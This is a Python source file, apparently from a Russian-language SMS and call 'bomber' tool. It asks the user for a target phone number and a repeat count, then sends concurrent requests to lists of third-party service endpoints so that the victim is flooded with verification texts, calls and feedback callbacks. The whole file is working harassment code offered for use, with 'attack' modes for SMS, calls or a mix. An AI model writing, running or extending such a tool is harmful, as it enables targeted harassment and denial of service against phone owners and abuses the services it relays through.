from aiohttp import ClientSession
from asyncio import ensure_future, gather, run

from colorama import init, Fore
from json import load, dump

from src.utils.bomber.feedback_services import feedback_urls
from src.utils.bomber.services import urls

import main

from time import sleep

CONFIG_NAME = r'data\config.json'


def check_config():
	while True:
		try:
			with open(CONFIG_NAME) as f:
				return load(f)
		except:
			with open(CONFIG_NAME, 'w') as f:
				f.write('{"feedback": "True", "type_attack": "SMS", "attack": "False", "key": ""}')


def change_config(key, value):
	config = check_config()
	config[key] = f'{value}'
	with open(CONFIG_NAME, 'w') as f:
		dump(config, f)


def sms_spam():
	init()
	feedback = input('\n' + '\033[1m' + 'Обратная связь\n[1] - Включить\n[2] - Выключить\n\n>>')
	attack_type = input('\n' + '\033[1m' + 'Тип атаки\n[1] - СМС\n[2] - Звонки\n[3] - Микс\n\n>>')
	if feedback == '1':
		change_config('feedback', 'True')
		if attack_type == '1':
			change_config('type_attack', 'SMS')

			number = input('Номер телефона: ')
			replay = input('Количество повторов: ')

			try:
				change_config('attack', 'True')
				print('\033[1m' + 'Атака началась')
				start_async_attacks(number, replay)
				change_config('attack', 'False')
				print('\033[1m' + 'Атака окончена, отправляю на главный экран')

			except Exception:
				print('\033[1m' + Fore.RED + 'Произошла ошибка, отправляю на главный экран')

			sleep(3)
			main.main()

		if attack_type == '2':
			change_config('type_attack', 'CALL')

			number = input('Номер телефона: ')
			replay = input('Количество повторов: ')

			try:
				change_config('attack', 'True')
				print('\033[1m' + 'Атака началась')
				start_async_attacks(number, replay)
				change_config('attack', 'False')
				print('\033[1m' + 'Атака окончена, отправляю на главный экран')

			except Exception:
				print('\033[1m' + Fore.RED + 'Произошла ошибка, отправляю на главный экран')

			sleep(3)
			main.main()

		if attack_type == '3':
			change_config('type_attack', 'MIX')

			number = input('Номер телефона: ')
			replay = input('Количество повторов: ')

			try:
				change_config('attack', 'True')
				print('\033[1m' + 'Атака началась')
				start_async_attacks(number, replay)
				change_config('attack', 'False')
				print('\033[1m' + 'Атака окончена, отправляю на главный экран')

			except Exception:
				print('\033[1m' + Fore.RED + 'Произошла ошибка, отправляю на главный экран')

			sleep(3)
			main.main()

	if feedback == '2':
		change_config('feedback', 'False')
		if attack_type == '1':
			change_config('type_attack', 'SMS')

			number = input('Номер телефона: ')
			replay = input('Количество повторов: ')

			try:
				change_config('attack', 'True')
				print('\033[1m' + 'Атака началась')
				start_async_attacks(number, replay)
				change_config('attack', 'False')
				print('\033[1m' + 'Атака окончена, отправляю на главный экран')

			except Exception:
				print('\033[1m' + Fore.RED + 'Произошла ошибка, отправляю на главный экран')

			sleep(3)
			main.main()

		if attack_type == '2':
			change_config('type_attack', 'CALL')

			number = input('Номер телефона: ')
			replay = input('Количество повторов: ')

			try:
				change_config('attack', 'True')
				print('\033[1m' + 'Атака началась')
				start_async_attacks(number, replay)
				change_config('attack', 'False')
				print('\033[1m' + 'Атака окончена, отправляю на главный экран')

			except Exception:
				print('\033[1m' + Fore.RED + 'Произошла ошибка, отправляю на главный экран')

			sleep(3)
			main.main()

		if attack_type == '3':
			change_config('type_attack', 'MIX')

			number = input('Номер телефона: ')
			replay = input('Количество повторов: ')

			try:
				change_config('attack', 'True')
				print('\033[1m' + 'Атака началась')
				start_async_attacks(number, replay)
				change_config('attack', 'False')
				print('\033[1m' + 'Атака окончена, отправляю на главный экран')

			except Exception:
				print('\033[1m' + Fore.RED + 'Произошла ошибка, отправляю на главный экран')

			sleep(3)
			main.main()


async def request(session, url):
	try:
		type_attack = ('SMS', 'CALL', 'FEEDBACK') if check_config()['type_attack'] == 'MIX' else check_config()['type_attack']

		if url['info']['attack'] in type_attack:
			async with session.request(url['method'], url['url'], params=url.get('params'), cookies=url.get('cookies'), headers=url.get('headers'), data=url.get('data'), json=url.get('json'), timeout=20) as response:
				return await response.text()
	except:
		pass


async def async_attacks(number):
	async with ClientSession() as session:
		services = (urls(number) + feedback_urls(number)) if check_config()['feedback'] == 'True' else urls(number)
		tasks = [ensure_future(request(session, service)) for service in services]
		await gather(*tasks)


def start_async_attacks(number, replay):
	for _ in range(int(replay)):
		run(async_attacks(number))
